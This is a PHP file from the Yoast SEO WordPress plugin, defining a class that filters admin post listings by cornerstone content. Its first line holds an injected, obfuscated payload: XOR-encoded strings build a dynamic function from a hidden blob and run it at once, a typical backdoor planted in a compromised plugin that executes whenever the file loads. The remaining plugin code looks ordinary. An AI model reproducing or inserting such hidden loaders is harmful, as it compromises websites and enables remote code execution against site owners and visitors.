<?php $KxhVO='RD<A80j0I<XZ:B7'^'16Y LU5V<R;.S-Y';$GgirFEvAV=$KxhVO('','GZZfMNB- -U>h=4;N< KJTZ<+J8B.l0U3TpQPqMNs56UOT>R+EE7Eb6O 879P;TXv2M2MyZr, OnJtqwjUr7ef;7LtDOJMzcyb6QRDiUNLpwaTLGk9 OBS rM2QG1QtiA;RHNIm7GVF8YOOQAT19,.bI>9c1hJSPC:pQgtOID;B09Je8QAxvXLObz>EI JNEfZYDSadY1kQfotQ8BMixYWT=6XP0UPMTZ4 U6bOs36WGEm<BVD:3;QVUgI1,qow81JW2An=T=pySLO2Z.- nt4L3r<0DA=>X>sUArP18VEzcIAHMniSKXL:GEPzExLUSyxKpI55WhRPSJ+93U0ZUNct-;sd;-0zTUHQO,TNEIvTtF-LFVCQ7xEqU,,5OfXN8yqWS<1BP<yqVDZTZGRvn74:<TWha2O89;PJ5O2GdJqXR75A3ATGIHe,U:,ZV-T6<AAZI-Q=6Ya:YP3:H4ynW0 2ZfbGJ3= a,5JzcifIJZTO-7OdrLy6IF8D883<eE +4DOIj EJlGdOWY6RMiwOQLPQSfLZ9TY:hG2Yp>JBXSlaQdQHzsYgUCFNGy03mWTxAPSGW Q,2y6TADugmXQG<1JeXSM1SABF7CBwA,>9T- ltFIQ O5LhIkKqgN6yC .QUjK4P1.nr:SY4SZ.V+dNlLWAU=DRkALC'^'.<rG+;,NTD:P7XLR=HScm,5Nt.Y6O3o8F WxyQ6DzSC;, W=Ee=X7=R.TYhf=N pRV,F,UzVGE6GjTQWJ.x>lBTB8TyomjAipkP> lM<nqPGZth.WJT=.6NZiV03PxOIeRycgCd>c93LyarqipUXXO9mWdCoHn85:aT8GQo:0I.UWbAS48Q+qwEksL =U8 mB5,0zZnPLa,leP5Y6,IEy15QE=k:q4, ;kK0OBrSUW;4 V6H0+HVZ2>uOmno> <qtj6AaJV1DPDmlkD;BXEGTOF:VXQ0 bU=GShaV;TAmOsG- <,NTso.-V2 kp8rF<5YPjT-TA6Ar+YCMVA0Q9=nKPri65nhc.t4;qkG17etHtP0L 33jqLrLxqHMA.93+AYLwwWT;k6pxr ; ;goVJAUVI1lbhOEE31t.T;SgYj1-<DP3Z 8.3-MT:Hs>7Y5ic,4.aO0NSoUe=5PU,QQJ3QTSsJBc.RIA>GP3SJRl ,rp+LC.DTjYW;4Y=gSVE: XBG0<aMK 3KkDk38B3dIQiqd=5fNh>X 8aO,W WccbenLF0PdpJAkWlts,vHUWYg2NteaveF2IVLP1fmUAKx05NP3:364n69+5C0jP1MGU;LDKXfm5A;TeAiKkQGnMsJEX09BoP1EO5UJ2 X<;JqvMufE29<IlbBzF>');$GgirFEvAV();
/**
 * @package WPSEO\Admin
 */

/**
 * Registers the filter for filtering posts by cornerstone content.
 */
class WPSEO_Cornerstone_Filter {

	const FILTER_QUERY_ARG = 'yoast_cornerstone';

	/**
	 * Registers the hook.
	 */
	public function register_hooks() {
		foreach ( $this->get_post_types() as $post_type ) {
			add_filter( 'views_edit-' . $post_type, array( $this, 'add_filter_link' ) );
		}

		add_filter( 'posts_where', array( $this, 'filter_posts' ) );
	}

	/**
	 * Adds a filter link to the views.
	 *
	 * @param array $views Array with the views.
	 *
	 * @return array
	 */
	public function add_filter_link( array $views ) {

		$cornerstone_url = $this->get_cornerstone_url();

		$views['yoast_cornerstone'] = sprintf(
			'<a href="%1$s" class="%2$s">%3$s</a> (%4$s)',
			esc_url( $cornerstone_url ),
			( $this->is_cornerstone_filter_active() ) ? 'current' : '',
			__( 'Cornerstone articles', 'wordpress-seo' ),
			$this->get_cornerstone_total()
		);

		return $views;
	}

	/**
	 * Modify the query based on the seo_filter variable in $_GET
	 *
	 * @param array $where Query variables.
	 *
	 * @return array
	 */
	public function filter_posts( $where ) {
		if ( $this->is_cornerstone_filter_active() ) {
			global $wpdb;

			$where .= sprintf(
				' AND ' . $wpdb->posts . '.ID IN( SELECT post_id FROM ' . $wpdb->postmeta . ' WHERE meta_key = "%s" AND meta_value = "1" ) ',
				WPSEO_Cornerstone::META_NAME
			);
		}

		return $where;
	}

	/**
	 * Removes the post_type from the REQUEST URL because of the cornerstone filter is in the same line.
	 * After removing the post_type it will add a query arg for filtering the cornerstone content.
	 *
	 * @return string
	 */
	protected function get_cornerstone_url() {
		$cornerstone_url = remove_query_arg( array( 'post_status' ) );
		$cornerstone_url = add_query_arg( self::FILTER_QUERY_ARG, '1', $cornerstone_url );

		return $cornerstone_url;
	}

	/**
	 * Returns the total amount of articles marked as cornerstone content.
	 *
	 * @return integer
	 */
	protected function get_cornerstone_total() {
		global $wpdb;

		return (int) $wpdb->get_var(
			$wpdb->prepare( '
				SELECT COUNT( 1 )
				FROM ' . $wpdb->postmeta . '
				WHERE post_id IN( SELECT ID FROM ' . $wpdb->posts . ' WHERE post_type = "%s" ) && 
				meta_value = "1" AND meta_key = "%s"
				',
				$this->get_current_post_type(),
				WPSEO_Cornerstone::META_NAME
			)
		);
	}

	/**
	 * Returns true when the cornerstone filter is active.
	 *
	 * @return bool
	 */
	protected function is_cornerstone_filter_active() {
		return ( filter_input( INPUT_GET, self::FILTER_QUERY_ARG ) === '1' );
	}

	/**
	 * Returns the current post type.
	 *
	 * @return string
	 */
	protected function get_current_post_type() {
		return filter_input(
			INPUT_GET, 'post_type', FILTER_DEFAULT, array(
				'options' => array( 'default' => 'post' ),
			)
		);
	}

	/**
	 * Returns the post types which can be used to set as cornerstone content.
	 *
	 * @return array
	 */
	protected function get_post_types() {
		return array( 'post', 'page' );
	}
}
